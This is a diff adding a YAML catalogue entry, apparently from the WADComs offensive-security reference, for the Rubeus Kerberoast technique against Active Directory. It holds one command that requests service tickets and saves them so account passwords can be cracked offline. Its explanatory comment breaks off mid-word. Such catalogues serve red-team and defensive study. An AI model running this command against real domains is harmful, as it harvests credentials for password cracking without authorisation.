@@ -1,0 +1,31 @@
+id: wadcoms/rubeus-kerberoast
+type: technique
+platform: active-directory
+name: Rubeus Kerberoast
+phases:
+- execution
+- privilege-escalation
+capabilities:
+- command-execution
+- privilege-escalation
+privilege_required: domain-user
+sources:
+- project: WADComs
+  upstream_url: https://wadcoms.github.io
+  license: verify upstream LICENSE
+  upstream_version: a864cd1
+  last_synced: '2026-08-25'
+preconditions:
+- shell
+commands:
+- template: Rubeus.exe kerberoast /outfile:hashes.txt
+  comment: Rubeus' `kerberoast` module will attempt to fetch Service Principal Names that are associated
+    with normal user accounts. What is returned is a ticket that is encrypted with the user account's
+    password, which can then be bruteforced offline. The following command is run on a Windo
+references:
+- https://github.com/GhostPack/Rubeus
+- https://github.com/GhostPack/Rubeus#kerberoast
+tags:
+- active-directory
+- wadcoms
+- kerberos
